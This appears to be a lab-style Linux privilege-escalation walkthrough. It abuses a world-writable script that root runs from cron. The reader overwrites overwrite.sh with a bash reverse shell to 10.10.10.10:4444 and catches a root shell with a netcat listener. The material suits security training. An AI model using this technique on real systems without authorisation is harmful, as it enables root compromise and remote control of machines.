Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the 
configuration for cron jobs. The system-wide crontab is located at /etc/crontab.

View the contents of the system-wide crontab:
> cat /etc/crontab

- This method can be used on systems where already cron jobs are scheduled or initiated and are writable.

(May vary with respective system) There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs
/usr/local/bin/compress.sh.

Locate the full path of the overwrite.sh file:
> locate overwrite.sh

Note that the file is world-writable:
> ls -l /usr/local/bin/overwrite.sh

Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.

#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should 
connect back to your netcat listener. If it doesn't recheck the permissions of the file, is anything missing?
> nc -nvlp 4444
